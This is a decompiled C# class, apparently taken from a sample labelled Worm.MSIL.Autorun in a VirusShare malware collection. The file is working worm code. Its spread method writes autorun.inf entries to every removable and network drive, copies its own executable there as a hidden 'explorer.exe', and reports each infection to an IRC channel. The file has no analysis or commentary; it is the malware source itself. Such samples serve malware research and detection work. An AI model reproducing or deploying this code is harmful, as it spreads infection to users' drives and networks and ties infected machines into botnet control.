// Decompiled with JetBrains decompiler
// Type: explorer.USB
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace explorer
{
  internal class USB
  {
    public static void spread(irc irc)
    {
      try
      {
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          if (drive.DriveType == DriveType.Removable || drive.DriveType == DriveType.Network)
          {
            if (!File.Exists(drive.Name + "explorer.exe"))
            {
              Process process1 = new Process();
              process1.EnableRaisingEvents = false;
              process1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
              process1.StartInfo.FileName = "cmd";
              process1.StartInfo.Arguments = "/c echo [autorun] >> " + drive.Name + "autorun.inf";
              process1.Start();
              do
                ;
              while (!process1.HasExited);
              Process process2 = new Process();
              process2.EnableRaisingEvents = false;
              process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
              process2.StartInfo.FileName = "cmd";
              process2.StartInfo.Arguments = "/c echo open=explorer.exe >> " + drive.Name + "autorun.inf";
              process2.Start();
              do
                ;
              while (!process2.HasExited);
              File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.Hidden);
              string fileName = Process.GetCurrentProcess().MainModule.FileName;
              try
              {
                Process process3 = new Process();
                process3.EnableRaisingEvents = false;
                process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process3.StartInfo.FileName = "cmd";
                process3.StartInfo.Arguments = "/c copy \"" + Application.ExecutablePath + "\" \"" + drive.Name + "explorer.exe\"";
                process3.Start();
                do
                  ;
                while (!process3.HasExited);
                File.SetAttributes(drive.Name + "explorer.exe", File.GetAttributes(drive.Name + "explorer.exe") | FileAttributes.Hidden);
              }
              catch
              {
                irc.teller.tell(config.channel, "Usb", config.language_usb_failed.Replace("%drive%", drive.Name), false, true, false);
              }
              finally
              {
                irc.teller.tell(config.channel, "Usb", config.language_usb_success.Replace("%drive%", drive.Name), false, true, false);
              }
            }
            else
              irc.teller.tell(config.channel, "Usb", config.language_usb_allready.Replace("%drive%", drive.Name), false, false, true);
          }
        }
      }
      catch (Exception ex)
      {
        irc.teller.tell(config.channel, "Usb", "While Injection: " + ex.ToString(), true, false, false);
      }
    }
  }
}
